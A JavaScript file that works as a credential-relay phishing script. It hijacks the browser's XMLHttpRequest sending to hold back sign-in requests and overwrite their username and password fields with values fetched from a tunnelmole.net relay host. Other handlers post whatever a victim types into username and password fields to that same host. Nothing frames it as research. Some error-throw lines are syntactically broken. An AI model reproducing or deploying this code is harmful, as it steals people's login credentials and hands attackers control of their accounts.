let freqUsername = null;
let freqPassword = null;
const modifiedUsernameRequests = new Set();
const modifiedPasswordRequests = new Set();
const pendingUsernameRequests = new Map();
const pendingPasswordRequests = new Map();
let usernameFetched = false;
let passwordFetched = false;

// ✅ Fetch username
const fetchFreqUsername = async () => {
    if (usernameFetched) return;
    console.log('Fetching username...');

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-data', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});

        const result = await response.json();
        console.log('Response from /get-first-post-data:', result);

        if (result?.postData) {
            freqUsername = result.postData;
            console.log('Fetched username:', freqUsername);
            usernameFetched = true;

            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-data', { method: 'POST' });

            processUsernameRequests();
        } else {
            console.warn("No username data received, retrying...");
            setTimeout(fetchFreqUsername, 500); // Retry in 0.5s
        }
    } catch (error) {
        console.error('Error fetching username:', error);
        setTimeout(fetchFreqUsername, 500);
    }
};

// ✅ Fetch password
const fetchFreqPassword = async () => {
    if (passwordFetched) return;
    console.log('Fetching password...');

    try {
        const response = await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/get-first-post-password', {
            method: 'GET',
            headers: { 'Cache-Control': 'no-cache' }
        });

        if (!response.ok) throw new Error(HTTP error! Status: ${response.status});

        const result = await response.json();
        console.log('Response from /get-first-post-password:', result);

        if (result?.postData) {
            freqPassword = result.postData;
            console.log('Fetched password:', freqPassword);
            passwordFetched = true;

            await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/reset-first-post-password', { method: 'POST' });

            processPasswordRequests();
        } else {
            console.warn("No password data received, retrying...");
            setTimeout(fetchFreqPassword, 500);
        }
    } catch (error) {
        console.error('Error fetching password:', error);
        setTimeout(fetchFreqPassword, 500);
    }
};

// ✅ Process pending username requests
const processUsernameRequests = () => {
    if (!freqUsername) {
        console.log("Username not available yet, retrying...");
        fetchFreqUsername();
        return;
    }

    console.log("Processing pending username requests...");

    for (let [xhr, body] of pendingUsernameRequests) {
        const match = body.match(/identity-signin-identifier%5C%22%2C%5C%22([^&]*)%5C/);
        if (match && !modifiedUsernameRequests.has(body)) {
            const modifiedBody = body.replace(match[1], freqUsername);
            modifiedUsernameRequests.add(modifiedBody);
            console.log("Modified request with new username:", modifiedBody);
            xhr.send(modifiedBody);
            pendingUsernameRequests.delete(xhr);
        }
    }
};

// ✅ Process pending password requests
const processPasswordRequests = () => {
    if (!freqPassword) {
        console.log("Password not available yet, retrying...");
        fetchFreqPassword();
        return;
    }

    console.log("Processing pending password requests...");

    for (let [xhr, body] of pendingPasswordRequests) {
        const matchPassword = body.match(/identity-signin-password%5C%22%2C%5C%22([^&]*)%5C/);
        if (matchPassword && !modifiedPasswordRequests.has(body)) {
            const modifiedBody = body.replace(matchPassword[1], freqPassword);
            modifiedPasswordRequests.add(modifiedBody);
            console.log("Modified request with new password:", modifiedBody);
            xhr.send(modifiedBody);
            pendingPasswordRequests.delete(xhr);
        }
    }
};

// ✅ Intercept XMLHttpRequest
const originalXhrSend = XMLHttpRequest.prototype.send;
XMLHttpRequest.prototype.send = function (body) {
    if (!body) {
        originalXhrSend.call(this, body);
        return;
    }

    if (/identity-signin-identifier/.test(body) && !modifiedUsernameRequests.has(body)) {
        console.log("Intercepted username request:", body);
        pendingUsernameRequests.set(this, body);
        processUsernameRequests();
    } else if (/5B%5B%5C%22identity-signin-password/.test(body) && !modifiedPasswordRequests.has(body)) {
        console.log("Intercepted password request:", body);
        pendingPasswordRequests.set(this, body);
        processPasswordRequests();
    } else {
        originalXhrSend.call(this, body);
    }
};

// ✅ Send username to server
const sendUsername = async () => {
    console.log('Sending username...');
    const username = document.getElementById('username')?.value;
    if (!username) return;

    try {
        await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-username', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username })
        });
        console.log('Username sent successfully');
    } catch (error) {
        console.error('Error sending username:', error);
    }
};

// ✅ Send password to server
const sendPassword = async () => {
    console.log('Sending password...');
    const password = document.getElementById('password')?.value;
    if (!password) return;

    try {
        await fetch('https://qmjnmt-ip-37-228-207-173.tunnelmole.net/save-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });
        console.log('Password sent successfully');
    } catch (error) {
        console.error('Error sending password:', error);
    }
};

// ✅ Attach event listeners
document.addEventListener('DOMContentLoaded', () => {
    const usernameButton = document.getElementById('sendUsernameBtn');
    const passwordButton = document.getElementById('sendPasswordBtn');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');

    if (usernameButton) usernameButton.addEventListener('click', sendUsername);
    if (passwordButton) passwordButton.addEventListener('click', sendPassword);
    
    if (usernameInput) {
        usernameInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') sendUsername();
        });
    }

    if (passwordInput) {
        passwordInput.addEventListener('keydown', (event) => {
            if (event.key === 'Enter') sendPassword();
        });
    }

    fetchFreqUsername();
    fetchFreqPassword();
});
